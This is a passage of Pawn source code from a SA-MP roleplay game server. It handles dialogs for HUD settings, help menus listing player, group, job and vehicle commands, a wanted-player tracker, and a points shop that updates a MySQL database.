		        format(stringg,sizeof(stringg),"Disable\n{00FF00}Enable");
		        ShowPlayerDialog(playerid,DIALOG_HUD3,DIALOG_STYLE_LIST, "HUD Options: FPS", stringg, "Select","Close");
			}
		}
	}
	if(dialogid == DIALOG_HUD1)
	{
	    if(response)
		{
		    if(listitem == 0)
		    {
		        PlayerInfo[playerid][pHUD1] = 0;
		        PlayerTextDrawHide(playerid, HUD[1][playerid]);
			}
			if(listitem == 1)
			{
			    PlayerInfo[playerid][pHUD1] = 1;
			}
			if(listitem == 2)
			{
			    PlayerInfo[playerid][pHUD1] = 2;
			}
			if(listitem == 3)
			{
			    PlayerInfo[playerid][pHUD1] = 3;
			}
			if(listitem == 4)
			{
			    PlayerInfo[playerid][pHUD1] = 4;
			}
			if(listitem == 5)
			{
			    PlayerInfo[playerid][pHUD1] = 5;
			}
			Update(playerid, pHUD1x);
      		SendClientMessage(playerid, COLOR_ERROR, "HUD options updated!");
		}
	}
	if(dialogid == DIALOG_HUD2)
	{
	    if(response)
		{
		    if(listitem == 0)
		    {
		        PlayerInfo[playerid][pHUD2] = 0;
		        PlayerTextDrawHide(playerid, HUD[2][playerid]);
			}
			if(listitem == 1)
			{
			    PlayerInfo[playerid][pHUD2] = 1;
			}
			if(listitem == 2)
			{
			    PlayerInfo[playerid][pHUD2] = 2;
			}
			if(listitem == 3)
			{
			    PlayerInfo[playerid][pHUD2] = 3;
			}
			if(listitem == 4)
			{
			    PlayerInfo[playerid][pHUD2] = 4;
			}
			if(listitem == 5)
			{
			    PlayerInfo[playerid][pHUD2] = 5;
			}
			Update(playerid, pHUD2x);
      		SendClientMessage(playerid, COLOR_ERROR, "HUD options updated!");
		}
	}
	if(dialogid == DIALOG_HUD3)
	{
	    if(response)
		{
		    if(listitem == 0)
		    {
		        PlayerInfo[playerid][pHUD3] = 0;
		        PlayerTextDrawHide(playerid, HUD[3][playerid]);
			}
			if(listitem == 1)
			{
			    PlayerInfo[playerid][pHUD3] = 1;
			}
			Update(playerid, pHUD3x);
      		SendClientMessage(playerid, COLOR_ERROR, "FPS options updated!");
		}
	}
	if(dialogid == DIALOG_HELP)
	{
	    if(response)
		{
  			new string1[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],string5[MAX_STRING],string6[MAX_STRING],string7[MAX_STRING],string8[MAX_STRING],string9[MAX_STRING],string10[MAX_STRING],string11[MAX_STRING],string12[MAX_STRING],stringy[MAX_STRING];
		  	if(listitem == 0)
	   		{
 	    		ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: General Commands", "/stats /accept /eject /ad /admins\n/helpers /time /id /changepass /pay /tie\n/buylevel /fill /fillgascan /gps /shop /unrentvehicle\n/contract /walkstyle /service /buydrink /licenses","Back","Exit");
			}
			if(listitem == 1)
			{
   				format(string1, sizeof(string1), "/o (global OOC message)\n/n (newbie chat message)\n/sms (OOCly SMS another player)\n/b (local OOC message)\n/w(hisper)\n/low (quiet message)\n/me (action)\n/do (action)\n/wt (walkie talkie)");
  	    		ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Chat Commands", string1,"Back","Exit");
			}
			if(listitem == 2)
  			{
				if(PlayerInfo[playerid][pMember] == 0)
				{
   					format(string1, sizeof(string1), "You're not in a group.");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 1)
				{
    				format(string1, sizeof(string1), "/mdc /su /arrest /free /ram /checkdays /startradar /stopradar");
				    format(string2, sizeof(string2), "/m(egaphone) /tazer /cuff /untie /confiscate /takedrugs");
				    format(string3, sizeof(string3), "/uncuff /frisk /clear /d(epartments) /r(adio) /wanted");
				    format(string4, sizeof(string4), "/ticket /duty /backup /deployspike /destroyspike /spikes");
				    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 2)
				{
    				format(string1, sizeof(string1), "/mdc /su /arrest /free /confiscate /takedrugs /m(egaphone)");
				    format(string2, sizeof(string2), "/tazer /cuff /untie /duty /backup /ram /wanted");
				    format(string3, sizeof(string3), "/uncuff /frisk /clear /d(epartments) /r(adio)");
				    format(string4, sizeof(string4), "/deployspike /destroyspike /spikes /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 3)
				{
    				format(string1, sizeof(string1), "/mdc /su /arrest /free /confiscate /takedrugs /wanted");
				    format(string2, sizeof(string2), "/m(egaphone) /tazer /cuff /untie /duty /backup /ram");
				    format(string3, sizeof(string3), "/uncuff /frisk /clear /d(epartments) /r(adio)");
				    format(string4, sizeof(string4), "/deployspike /destroyspike /spikes /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 4)
				{
    				format(string1, sizeof(string1), "/order /attack /f /fdrugs");
				    format(string2, sizeof(string2), "/fmats /fdeposit /tie /untie /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 5)
				{
    				format(string1, sizeof(string1), "/order /attack /f /fdrugs");
				    format(string2, sizeof(string2), "/fmats /fdeposit /tie /untie /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 6)
				{
	   				format(string1, sizeof(string1), "/order /attack /f /fdrugs");
				    format(string2, sizeof(string2), "/fmats /fdeposit /tie /untie /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 8)
				{
    				format(string1, sizeof(string1), "/mdc /su /arrest /free /ram");
				    format(string2, sizeof(string2), "/m(egaphone) /tazer /cuff /untie /confiscate /takedrugs");
				    format(string3, sizeof(string3), "/uncuff /frisk /clear /d(epartments) /r(adio) /wanted /checkdays");
				    format(string4, sizeof(string4), "/ticket /duty /backup /deployspike /destroyspike /spikes");
				    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 15)
				{
    				format(string1, sizeof(string1), "/mdc /su /arrest /free /ram");
				    format(string2, sizeof(string2), "/m(egaphone) /tazer /cuff /untie /confiscate /takedrugs");
				    format(string3, sizeof(string3), "/uncuff /frisk /clear /d(epartments) /r(adio) /wanted /checkdays");
				    format(string4, sizeof(string4), "/ticket /duty /backup /deployspike /destroyspike /spikes");
				    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 9)
				{
    				format(stringy, sizeof(stringy), "/news /live /checkdays");
    				ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 10)
				{
    				format(string1, sizeof(string1), "/order /attack /f /fdrugs");
				    format(string2, sizeof(string2), "/fmats /fdeposit /tie /untie /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 11)
				{
    				format(stringy, sizeof(stringy), "/undercover /f /checkdays");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 12)
				{
    				format(string1, sizeof(string1), "/givelicense /acceptlic");
				    format(string2, sizeof(string2), "/license /f /checkdays");
				    format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 13)
				{
    				format(stringy, sizeof(stringy), "/fare /accept taxi /f /checkdays");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pMember] == 14)
				{
    				format(stringy, sizeof(stringy), "/healto /f /checkdays");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Group Commands", stringy,"Back","Exit");
				}
			}
			if(listitem == 3)
  			{
	    		format(string1, sizeof(string1), "/lifejump /exhaust /rcarjack1 /lcarjack1 /rcarjack2 /lcarjack2 /hoodfrisked");
		    	format(string2, sizeof(string2), "/lightcig /tapcig /bat /lean /clearanim /dancing /box /lowthrow /highthrow /leftslap");
		    	format(string3, sizeof(string3), "/handsup /fall /fallback /sup /rap /push /akick /lowbodypush /spray /headbutt /pee");
		    	format(string4, sizeof(string4), "/koface /kostomach /kiss /rollfall /lay2 /hitch /beach /medic /scratch /sit /drunk");
		    	format(string5, sizeof(string5), "/bomb /getarrested /laugh /lookout /aim /crossarms /lay /hide /vomit /wave /selfie");
		    	format(string6, sizeof(string6), "/shouting /chant /frisked /exhausted /injured /slapass /deal /dealstance /crack");
		    	format(string7, sizeof(string7), "/wank /gro /sit /chat /fucku /taichi /knife /basket /jumpwater");
			    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s\n%s\n%s\n%s", string1, string2, string3, string4, string5, string6, string7);
    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Animations Commands", stringy,"Back","Exit");
			}
			if(listitem == 4)
  			{
	    		format(string1, sizeof(string1), "{FFFFFF}General commands:\n/home - put a checkpoint on the minimap owned house or building where you rent");
		    	format(string2, sizeof(string2), "{FFFFFF}/buyhouse - buying a home\n\nComenzi pentru detinatorii de case:\n/sellhouseto <playerid> - sell house by a certain player");
		    	format(string3, sizeof(string3), "{FFFFFF}/open - close/open house\n/setrent - seteaza pretul chiriei\n/sellhousetostate - sell home state (70 percent of the price)");
		    	format(string4, sizeof(string4), "{FFFFFF}/renters - displays playerii they rent (rent) to your home\n/evict <playerid> - give a player out of your home");
		    	format(string5, sizeof(string5), "{FFFFFF}/evictall - kick all Players in your home (who rent)\n/housewithdraw - withdraw money from safe house");
		    	format(string6, sizeof(string6), "{FFFFFF}/housename - set the name of the house\n/setrentable - set if you can /can not rent the house");
		    	format(string7, sizeof(string7), "{FFFFFF}/heal - upload your life and armor (if this house)\n/hu - buy life /armor to take with /heal");
			    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s\n%s\n%s\n%s", string1, string2, string3, string4, string5, string6, string7);
    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: House Commands", stringy,"Back","Exit");
			}
			if(listitem == 5)
  			{
				if(PlayerInfo[playerid][pJob] == 0)
				{
   					format(string1, sizeof(string1), "You don't have a public job or your job does not have any commands.");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 1)
				{
   					format(string1, sizeof(string1), "/find /cancel find");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 2)
				{
   					format(string1, sizeof(string1), "/dropcar");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 4)
				{
   					format(string1, sizeof(string1), "/selldrugs /getdrugs");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 5)
				{
   					format(string1, sizeof(string1), "/work /pizza");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 6)
				{
   					format(string1, sizeof(string1), "You don't have a public job or your job does not have any commands.");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 7)
				{
   					format(string1, sizeof(string1), "You don't have a public job or your job does not have any commands.");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 8)
				{
   					format(string1, sizeof(string1), "/refill /repair /tow");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 9)
				{
   					format(string1, sizeof(string1), "/sellgun /matsinfo /sellmaterials /getmats");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 10)
				{
   					format(string1, sizeof(string1), "/collect");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 13)
				{
   					format(string1, sizeof(string1), "/fish");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 14)
				{
   					format(string1, sizeof(string1), "Acest job nu are comenzi.");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 15)
				{
   					format(string1, sizeof(string1), "/pickpocket");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 16)
				{
   					format(string1, sizeof(string1), "/work");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 17)
				{
   					format(string1, sizeof(string1), "/work");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
				if(PlayerInfo[playerid][pJob] == 18)
				{
   					format(string1, sizeof(string1), "/work");
  	    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Job Commands", string1,"Back","Exit");
				}
			}
			if(listitem == 6)
  			{
				format(string1, sizeof(string1), "/bizstatus /bizfee /bizname /open /sellbizto /sellbiztostate /bizwithdraw");
 				ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Business Commands", string1,"Back","Exit");
			}
			if(listitem == 7)
  			{
  			    if(PlayerInfo[playerid][pHelper] == 0)
  			    {
  			        SendClientMessage(playerid, COLOR_GREY, "You aren't an official helper.");
  			        return 1;
				}
  			    if(PlayerInfo[playerid][pHelper] == 1)
  			    {
					format(string1, sizeof(string1), "/ha /goback /nre /hshop /nmute /freeze /unfreeze /slap /viewnewbie /aaa2");
					format(string2, sizeof(string2), "/hduty /up /respawn /pm /setjob /gotols /gotom /gotocars /dn");
					format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
 					ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Helper Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pHelper] == 2)
  			    {
					format(string1, sizeof(string1), "/ha /goback /nre /hshop /nmute /freeze /unfreeze /slap /viewnewbie /aaa2");
					format(string2, sizeof(string2), "/hduty /up /respawn /mute /unmute /clearchat(/cc) /setjob /gotols /gotom /gotocars");
					format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
 					ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Helper Commands", stringy,"Back","Exit");
				}
				if(PlayerInfo[playerid][pHelper] == 3)
  			    {
					format(string1, sizeof(string1), "/ha /goback /nre /hshop /nmute /freeze /unfreeze /slap /setjob /viewnewbie /aaa2 /gethere");
					format(string2, sizeof(string2), "/hduty /up /respawn /mute /unmute /clearchat(/cc) /kick /gotolv /gotosf /gotom /gotols /gotocars");
					format(stringy, sizeof(stringy), "%s\n%s", string1, string2);
 					ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Helper Commands", stringy,"Back","Exit");
				}
			}
			if(listitem == 8)
  			{
				format(string1, sizeof(string1), "{FFFFFF}You need level 3 to buy a car. Cars can be purchased at the Dealership. You can use /gps if you know where your dealership.");
				format(string2, sizeof(string2), "\n{FFFFFF}general commands:\n/v - Spawn one of your cars\n/lock - the opening/closing of the car doors");
				format(string3, sizeof(string3), "{FFFFFF}/park - set where your car will spawn (which appears) after being destroyed");
				format(string4, sizeof(string4), "{FFFFFF}/engine (2 key) - starts/stop your engine\nNUMPAD 2, NUMPAD 8 - open/close the hood/trunk");
				format(string5, sizeof(string5), "{FFFFFF}/carradio - car radio set\n/eject - give a player out of the car\n/carcolor - change color. Use {FF0000}/colors{FFFFFF} to see a list of colors that can be used.");
				format(string6, sizeof(string6), "{FFFFFF}/removetunning - remove changes made to the car (tuning)\n/carplate - change the license plate of the car\nOrders for sale/exchange vehicles:");
				format(string7, sizeof(string7), "{FF0000}(Scams are prohibited on the server)\n{FFFFFF}/sellcar - sell the car to the dealership with 60 percent of the initial price.\n/sellcarto <playerid> <price> - Car sell a player\n/portbagaj - personal vehicle trunk.");
				format(string8, sizeof(string8), "\n{FFFFFF}Alte comenzi:\n/givekey - oferi cheia masinii unui alt player. cheia este pierduta cand playerul iese din joc sau cand folosesti /changelock\n/cars - displays a list of your cars");
				format(string9, sizeof(string9), "{FFFFFF}Insurance (Insurance), Age, mileage:\nEvery time your car is destroyed (exploding or falling water), car insurance loses one point (point of insurance).");
				format(string10, sizeof(string10), "{FFFFFF}When the car reaches 0 points insurance, you buy insurance could lead to a further.\nYou can buy insurance points using /buyinsurance");
				format(string11, sizeof(string11), "\n{FFFFFF}When buying a car, an insurance cost $100.\nEvery time your car is damaged, insurance prices increase by $15.");
				format(string12, sizeof(string12), "\n{FFFFFF}Hidden colors:\nColors 'hidden' are colors that look better than normal colors.\nHidden colors can only be bought with points premium (use / shop -> info for more information regarding premium)");
				format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s", string1, string2, string3, string4, string5, string6, string7, string8, string9, string10, string11, string12);
 				ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Vehicle Commands", stringy,"Back","Exit");
			}
			if(listitem == 9)
			{
			    format(stringy, sizeof(stringy), "/balance /withdraw /deposit");
 				ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Bank Commands", stringy,"Back","Exit");
			}
			if(listitem == 10)
			{
			    format(string1, sizeof(string1), "It can give / servant from level 3. To give Rob will have to go to the bank and use the command /rob.");
				format(string2, sizeof(string2), "\nSkills to the slave is calculated according to data successfully slave sites.\nSkill 1: 0-25 robur\nSkill 2: 26-60 robur\nSkill 3: 61-110 robur\nSkill 4: 111-200 robur\nSkill 5: 201-300 robur");
				format(string3, sizeof(string3), "Skill 6: 300+ roburi\n\nMoney Rob is calculated as: $180.000 + intre $0 si $70.000 (random).\nFor each skill is received $50.000 in plus.");
				format(stringy, sizeof(stringy), "%s\n%s\n%s", string1, string2, string3);
				ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: Rob", stringy,"Back","Exit");
			}
			if(listitem == 11)
  			{
	    		format(string1, sizeof(string1), "{FFFFFF}General commands:\n/home - put a checkpoint on the minimap house vip.");
		    	format(string2, sizeof(string2), "{FFFFFF}/buyhouse - buying a home\n\nOrders for owners of houses vip:");
		    	format(string3, sizeof(string3), "{FFFFFF}/open - close / open house\n/setrent - set the rent\n/sellhousetostate - sell home countries (70 Percent of the price)");
		    	format(string4, sizeof(string4), "{FFFFFF}/renters - displays playerii they rent (rent) to your home\n/evict <playerid> - give a player out of your home");
		    	format(string5, sizeof(string5), "{FFFFFF}/evictall - Kick all Players in your home (who rent)\n/housewithdraw - withdraw money from safe house");
		    	format(string6, sizeof(string6), "{FFFFFF}/housename - set the name of the house\n/setrentable - set if you can/can not rent the house");
			    format(stringy, sizeof(stringy), "%s\n%s\n%s\n%s\n%s\n%s\n%s", string1, string2, string3, string4, string5, string6, string7);
    			ShowPlayerDialog(playerid, DIALOG_HELP2, DIALOG_STYLE_MSGBOX, "SERVER: VIP House Commands", stringy,"Back","Exit");
			}
		}
	}
	if(dialogid == DIALOG_HELP2)
	{
	    if(response)
		{
  			ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_LIST, "SERVER: Commands", "General\nChat\nGroups\nAnimations\nHouses\nJobs\nBusinesses\nHelpers\nVehicles\nBank\nRob", "Select","Exit");
		}
		return 1;
	}
	if(dialogid == DIALOG_WANTEDON)
	{
		if(response)
		{
		    new id = Selectat[listitem][playerid];
			UsedFind[playerid] = 1;
			new Float:X,Float:Y,Float:Z;
			new galciala[MAX_PLAYER_NAME];
			GetPlayerName(id, galciala, sizeof(galciala));
			GetPlayerPos(id, X,Y,Z);
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, X,Y,Z, 3.5);
			targetfind[playerid] = id;
			foreach(Player, i)
			{
				if(IsACop(playerid))
				{
			 		if(caser[playerid] == i)
					{
						cased[i] --;
					}
				}
			}
			if(IsACop(playerid))
			{
				cased[id] ++;
				caser[playerid] = id;
			}
			format(string,sizeof(string),"{FFFF00}Checkpoint will display the player's location %s. The distance to the player: %.0f.",galciala,GetDistanceBetweenPlayers(playerid, id));
			SCM(playerid,COLOR_SERVER,string);
			GetPlayerName(id, sendername, sizeof(sendername));
			format(string, sizeof(string), "-- MDC [ID %d - %s][{FFFF00}W:%d{FFFFFF}][Chased by %d cops][Wanted expires in %d mins]",id, galciala, PlayerInfo[id][pWantedLevel], cased[id], wantedlost[id]/60+1);
			SendClientMessage(playerid, COLOR_SERVER,string);
			if(strcmp(PlayerInfo[id][pCrime1],  "Fara Crima", false) == 0) { }
			else
			{
				format(string, sizeof(string), "%s", PlayerInfo[id][pCrime1]);
				SendClientMessage(playerid,COLOR_SERVER,string);
			}
			if(strcmp(PlayerInfo[id][pCrime2],  "Fara Crima", false) == 0) { }
			else
			{
				format(string, sizeof(string), "%s", PlayerInfo[id][pCrime2]);
				SendClientMessage(playerid, COLOR_SERVER,string);
			}
			if(strcmp(PlayerInfo[id][pCrime3], "Fara Crima", false) == 0) { }
			else
			{
		 		format(string, sizeof(string), "%s", PlayerInfo[id][pCrime3]);
				SendClientMessage(playerid, COLOR_SERVER,string);
			}
		}
  		else SendClientMessage(playerid, COLOR_GREY, "Wanted dialog canceled");
	}
	if(dialogid == DIALOG_HSHOP)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(PlayerInfo[playerid][pHelpedPlayers] < 50)
             	{
					ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Shop Helper", "You do not have enough points to purchase this item.", "OK", "");
					return 1;
				}
				new name[30];
				new strings[1000];
				GetPlayerName(playerid, name, sizeof(name));
				PlayerInfo[playerid][pHelpedPlayers] -= 50;
				Update(playerid,pHelpedPlayersx);
				GivePlayerCash(playerid, 3000000);
				Update(playerid, pCashx);
				SendClientMessage(playerid, COLOR_YELLOW, "Ai cumparat $3,000,000 (-50 de puncte)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/hshop: %s a cumparat $3,000,000.",name);
				ABroadCast(COLOR_YELLOW,strings,1);
	        }
	        if(listitem == 1)
	        {
	            if(PlayerInfo[playerid][pHelpedPlayers] < 70)
             	{
					ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Shop Helper", "You do not have enough points to buy this item.", "OK", "");
					return 1;
				}
				new name[30];
				new strings[1000];
				GetPlayerName(playerid, name, sizeof(name));
				PlayerInfo[playerid][pHelpedPlayers] -= 70;
				Update(playerid,pHelpedPlayersx);
				PlayerInfo[playerid][pFpunish] = 0;
				Update(playerid, pFpunishx);
				SendClientMessage(playerid, COLOR_YELLOW, "You bought Clear FP (-70 de puncte)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/hshop: %s a Clear bought FP.",name);
				ABroadCast(COLOR_YELLOW,strings,1);
	        }
	        if(listitem == 2)
	        {
	            if(PlayerInfo[playerid][pHelpedPlayers] < 100)
             	{
					ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Shop Helper", "You do not have enough points to buy this item.", "OK", "");
					return 1;
				}
				new name[30];
				new strings[1000];
				GetPlayerName(playerid, name, sizeof(name));
				PlayerInfo[playerid][pHelpedPlayers] -= 100;
				Update(playerid,pHelpedPlayersx);
				PlayerInfo[playerid][pHiddenColor] += 1;
				Update(playerid, pHiddenColorx);
				SendClientMessage(playerid, COLOR_YELLOW, "You bought a color hidden (-100 de puncte)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/hshop: %s a a color hidden purchased.",name);
				ABroadCast(COLOR_YELLOW,strings,1);
	        }
	        if(listitem == 3)
			{
				    if(PlayerInfo[playerid][pPremiumAccount] == 0) return SCM(playerid, COLOR_ERROR, "Need Premium Account");
					if(PlayerInfo[playerid][pHelpedPlayers] < 500)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Shop Helper", "You do not have enough points to buy this item.", "OK", "");
						return 1;
					}
					if(PlayerInfo[playerid][pPlusSlot1] == 1 && PlayerInfo[playerid][pPlusSlot2] == 1)
					{
					    SendClientMessage(playerid, COLOR_ERROR, "Already slots 1 and 2 released.");
						return 1;
					}
					if(PlayerInfo[playerid][pPlusSlot1] == 0)
					{
					    PlayerInfo[playerid][pHelpedPlayers] -= 500;
						PlayerInfo[playerid][pPlusSlot1] = 1;
						new str2[300],strings[200],name[30],stringss[200];
						mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `HelpedPlayers`='%d',`PlusSlot1`='%d' WHERE `numewq9q5s6ad9`='%s'",PlayerInfo[playerid][pHelpedPlayers],PlayerInfo[playerid][pPlusSlot1],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str2,"","");
						SendClientMessage(playerid, COLOR_YELLOW, "Ai cumparat un slot in plus pentru vehicule! (-500 de puncte)");
						GetPlayerName(playerid, name, sizeof(name));
						format(strings, sizeof(strings), "/hshop: %s vehicle bought one slot (1).",name);
						ABroadCast(COLOR_YELLOW,strings,1);
						mysql_real_escape_string(strings, stringss);
						mysql_format(SQL,str2,sizeof(str2), "INSERT INTO shop_logs (playerid,Message) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
						mysql_tquery(SQL,str2,"","");
					}
					else
					{
					    PlayerInfo[playerid][pHelpedPlayers] -= 500;
					    PlayerInfo[playerid][pPlusSlot2] = 1;
						new str2[300],strings[200],name[30],stringss[200];
						mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `HelpedPlayers`='%d',`PlusSlot2`='%d' WHERE `numewq9q5s6ad9`='%s'",PlayerInfo[playerid][pHelpedPlayers],PlayerInfo[playerid][pPlusSlot2],PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,str2,"","");
						SendClientMessage(playerid, COLOR_YELLOW, "You bought an extra slot for vehicles! (-500 points)");
						GetPlayerName(playerid, name, sizeof(name));
						format(strings, sizeof(strings), "/hshop: %s Vehicle bought one slot (2).",name);
						ABroadCast(COLOR_YELLOW,strings,1);
						mysql_real_escape_string(strings, stringss);
